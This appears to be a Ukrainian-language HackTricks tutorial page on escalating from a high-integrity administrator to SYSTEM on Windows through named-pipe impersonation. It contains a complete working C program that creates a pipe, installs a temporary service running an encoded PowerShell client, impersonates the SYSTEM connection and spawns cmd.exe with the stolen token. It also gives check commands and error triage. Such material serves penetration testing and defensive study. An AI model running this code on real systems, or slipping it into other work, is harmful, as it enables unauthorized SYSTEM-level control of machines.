# Від High Integrity до SYSTEM за допомогою Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Це **варіант administrator/SCM** для impersonation через named pipe: elevated process створює тимчасову службу, дочірній процес якої підключається як `SYSTEM`, після чого impersonates цього client. Якщо початковий контекст не може створювати служби, але має `SeImpersonatePrivilege`, використовуйте privileged-service coercion; див. [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) і [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Створення служби потребує доступу до SCM і дозволу `SERVICE_START` для нової служби, тоді як `CreateProcessWithTokenW` потребує `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Швидко підтвердьте очікуваний початковий контекст:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Потік виконання коду:**

1. Створіть сервер іменованого каналу **до** запуску служби. Під час очікування вважайте повернення `ConnectNamedPipe` значення `FALSE` з `ERROR_PIPE_CONNECTED` успішним: це означає, що клієнт випередив сервер і підключився в проміжку між `CreateNamedPipe` та `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Створіть і запустіть службу, яка підключиться до створеного каналу та щось запише. Код служби виконає цей закодований PS-код: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Після підключення та запису службою викличте `ImpersonateNamedPipeClient`, відкрийте отриманий токен потоку та продублюйте його як первинний токен.<sup>[[1]](#references)</sup>
4. Використайте цей первинний токен для запуску `cmd.exe`.<sup>[[2]](#references)</sup>

Цей підхід передбачає, що викликач може створювати/запускати службу та має привілеї, необхідні для `CreateProcessWithTokenW` (зазвичай `SeImpersonatePrivilege`). Це техніка переходу від високої цілісності до SYSTEM, а не примітив, доступний довільному користувачеві з низькими привілеями.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Якщо створення/запуск служби завершиться помилкою, приклад не подасть сигнал потоку каналу, і той може чекати нескінченно. Перед використанням поза лабораторією додайте обробку помилок і тайм-аут для overlapped-каналу. Також використовуйте випадкове ім’я каналу/служби, щоб уникнути конфліктів.

`ImpersonateNamedPipeClient` приймає контекст, пов’язаний з **останнім прочитаним повідомленням**, тому самого підключення недостатньо: змусьте привілейованого клієнта виконати запис, переконайтеся, що `ReadFile` повернув дані, і лише після цього виконуйте impersonation. Продублюйте токен impersonation потоку в токен `TokenPrimary` з `SecurityImpersonation`; саме первинний токен використовує API створення процесів.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Тріаж помилок

- `ConnectNamedPipe == FALSE` з `ERROR_PIPE_CONNECTED`: продовжуйте; pipe уже підключено.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` завершується помилкою з `ERROR_CANNOT_IMPERSONATE` (`1368`): переконайтеся, що клієнт SYSTEM справді записав дані, а `ReadFile` завершив виконання. Також перевірте запитаний клієнтом рівень impersonation; клієнти з рівнем identification/anonymous неможливо повністю impersonate.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` завершується помилкою з `ERROR_PRIVILEGE_NOT_HELD` (`1314`): початковий caller не має `SeImpersonatePrivilege`. Із контексту адміністратора з high-integrity використовуйте маршрут копіювання token, описаний у [SeImpersonate from High To System](seimpersonate-from-high-to-system.md), або використовуйте `CreateProcessAsUserW` під час impersonating SYSTEM, якщо присутні необхідні privileges.<sup>[[2]](#references)</sup>
- `CreateServiceA` повертає `ERROR_SERVICE_EXISTS` (`1073`): видаліть застарілий запис `PiperSrv` або рандомізуйте `PIPESRV`; завжди видаляйте тимчасовий service після trigger.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
